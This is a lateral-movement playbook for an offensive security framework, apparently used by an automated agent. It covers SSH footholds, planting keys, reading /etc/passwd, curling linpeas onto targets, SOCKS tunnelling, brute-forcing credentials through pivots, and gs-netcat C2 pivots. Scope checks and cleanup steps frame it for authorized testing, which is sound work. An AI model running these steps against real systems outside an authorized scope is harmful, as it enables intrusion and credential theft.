# Playbook — Lateral Movement

Scope-check every hop. The scope guard runs on **each host**, so add the next
machine to `COBRA_ALLOWED_SCOPE` before acting on it. Tunnels additionally
need `COBRA_ENABLE_TUNNELS=1` (the xint equivalent for the server).

## Flow
1. **Foothold** — land a host: `exec_ssh <host> <user> <password|key_path> 'id'`.
2. **Harden access** — `ssh_key_setup <host> <user> <password>` once, then use
   `key_path` (key lives in `$COBRA_LOOT_DIR/keys/`) — no password reuse.
3. **Enumerate from inside** — `exec_ssh 'hostname; ip a; cat /etc/passwd'`,
   look for next-hop IPs, creds, subnets. Linpeas *on the target*: upload the
   vendored copy (`payload_serve` + `exec_ssh 'curl -o /tmp/lp.sh …'`) or use
   `local_privesc` output as your own-box baseline.
4. **Open a route** — `tunnel_socks_start` through the foothold (SOCKS5).
5. **Work the next machine through the tunnel** — every recon/web/creds tool
   takes `via="<tunnel-id>"`: `recon_full_scan <next-ip> via=<id>`,
   `creds_brute <next-ip> ssh <user> <wl> via=<id>`, `web_dir_brute <url> via=<id>`.
6. **Hop again** — new creds on machine B? `ssh_key_setup` + `exec_ssh` there;
   open another tunnel if B is only reachable from A.

## Decision points
- UDP next (SNMP/TFTP/DNS)? SOCKS carries TCP only — bounce through `exec_ssh`
  and run nmap from the foothold instead.
- Tunnel died (`ExitOnForwardFailure`/liveness check) → port clash on the
  local SOCKS port; pick another `local_port` or kill the blocking session.
- Windows hop with no SSH → that's the deferred `ad` profile work
  (impacket/netexec) — today: use exec_ssh on Linux hops, or hand off.
- gs-netcat pivot (NAT-proof SOCKS, both ends behind NAT)? see
  brain/playbooks/c2-gsocket.md — `c2_gs_deploy` + `c2_gs_socks_start` wrap it;
  the tunnel id works with `via=` like any ssh -D tunnel.

## Output discipline
- Record each foothold in brain `Access` (host, user, key path, tunnel id).
- Record each hop validation in brain `Credentials` (user, secret, valid-on).
- Note every failed hop in `Attempted & Failed` — never retry.
- Cleanup at engagement end: `tunnel_stop` all ids, remove the engagement
  pubkey from each `authorized_keys` (brain Cleanup Checklist).
